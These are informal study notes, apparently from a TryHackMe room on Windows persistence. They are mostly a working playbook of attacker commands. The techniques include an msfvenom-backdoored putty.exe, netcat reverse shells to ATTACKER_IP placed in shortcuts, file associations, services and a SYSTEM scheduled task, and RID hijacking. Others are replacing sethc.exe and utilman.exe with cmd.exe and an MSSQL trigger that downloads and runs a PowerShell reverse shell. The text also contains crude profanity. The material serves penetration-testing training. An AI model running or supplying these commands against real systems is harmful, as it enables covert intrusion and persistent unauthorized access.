
# Tampering with unprivileged users 

You might wonder we already have a admin user why i need a stupid fuck backdoor ??? Well it's simple admin user is heavily monitired and there's a pretty big chance we might get caught.

Adding a user to admin group 

```c
net localgroup administrators thmuser0 /add
```

```shell-session
net localgroup "Remote Management Users" thmuser1 /add
```

Also u can bypass UAC thingy 

```c
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```


# Special Privileges and Security Descriptors

We can export current config file 

```powershell
secedit /export /cfg config.inf
```

Then we will add our user to **SeBackupPrivilege** & **SeRestorePrivilege** group 

![[Pasted image 20230516172301.png]]

Now convert inf file to sdb file and load up the config 

```powershell
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

Now u can add that user to winrm using this 
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

# Rid hijacking 

When a user is created, an identifier called **Relative ID (RID)** is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

An admin will have a rid of 500 and anyother user will have **RID >= 1000**

```shell-session
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

Now u can open regedit 
```shell-session
PsExec64.exe -i -s regedit
```

After that go to `HKLM\SAM\SAM\Domains\Account\Users\`

Then you have to find the user usually it's in the form of hex , So over here i want to change thmuser3 whose id is 1010 will be  0x3F2

# Backdooring files 

First we will be backdoor an already existed exe file . 

First find a shortcut for any exe file on the machine then go in properties tab then download that executable file on your machine in this case putty.exe then embeed your code in it 

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```


Or you can create a powershell script 

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Then in the shortcut you can add something like this 

```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![[Pasted image 20230516231118.png]]


# Hijacking File associations 

In this we as a attacker change some registries and make os to run a system level command whenever we open a file of a specific type for example .txt or jpg

So to perfom this type of attack u gotta open reg editor (registry editor) then ![[Pasted image 20230516232035.png]]
**In this case we will be attacking .txt file 

![[Pasted image 20230516232121.png]]

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe  4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Now put this as new value in registry 

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor2.ps1
```

![[Pasted image 20230516232424.png]]

Now open any txt file to get shellzz

# Abusing services 

Why services cuz why not ?? It will start as soon as your machines start so yeah why not ?? maybe not to stealthy but yeah it is what it is . 

We can either change the passwd or we can add our own binary 

```shell-session
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

```shell-session
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

You can also list all service with this command 

```shell-session
sc.exe query state=all
```

You can also change the binary of already existing binary 

```shell-session
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

# Abusing schedule task 

We can use this command to create a task 

```shell-session
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

We can use this task to check whether the task is created or not 

```shell-session
schtasks /query /tn thm-taskbackdoor
```

Then we can delete the task from registry to make it "invisible"


![[Pasted image 20230517001928.png]]

# Loggon triggered Persistence

Uwu why ????? Well son if u don't want to wwait for eternity or for you marriage (which will never happen) u gotta get shell asap . In simple terms it mean u will get shell as soon as someone logs in . 

**Startup folder , we can place your executable over here and it will run it as soon as someone logs in...**

There are two way's to store file in it either we can go for a specific user or for everyone 

`C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`  

copy your exe file in any one of the dir and wait for someone to login . 


**Run / RunOnce**

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

-   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.

![[Pasted image 20230517235818.png]]


**Winlogon**

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

-   `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
-   `shell` points to the system's shell, which is usually `explorer.exe`.

![[Pasted image 20230518000354.png]]


# Backdooring the Login Screen / RDP

**Sticky Keys**

When pressing key combinations like `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:

![sticky keys](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/27e711818bea549ace3cf85279f339c8.png)

After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:

Command Prompt

```shell-session
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

After doing so, lock your session from the start menu:

![lock session](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2faf2bec5763297beb7c921858900c57.png)

You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen:

![sethc backdoor](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5062148957ec1d70dccd080bdca93ddf.png)


**Utilman**

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![utilman](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/73c7698a015de5a988fd815ff3e41473.png)

When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.

To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:

Command Prompt

```shell-session
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

To trigger our terminal, we will lock our screen from the start button:

![lock session](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1f94b28361ffebbf70d280755821bc12.png)

And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges:

![backdoored utilman](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0fe1901296108241e2700abf87fa6a27.png)


# Using MSSQL as a Backdoor

There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, **triggers** in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the `HRDB` database.

Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.

To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu. When asked for authentication, just use **Windows Authentication** (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on the **New Query** button to open the query editor:

![New SQL query](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb3aaca1ed1da7d1e08f0c3069a5633a.png)

Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa` user, which is the default database administrator:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

After all of this, we finally configure a trigger. We start by changing to the `HRDB` database:

```sql
USE HRDB
```

Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

We will need to open two terminals to handle the connections involved in this exploit:

-   The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.
-   The second connection will be a reverse shell on port 4454 back to our attacker machine.

AttackBox

```shell-session
user@AttackBox$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

 

AttackBox

```shell-session
user@AttackBox$ nc -lvp 4454
Listening on 0.0.0.0 4454
```

With all that ready, let's navigate to `http://10.10.3.246/` and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
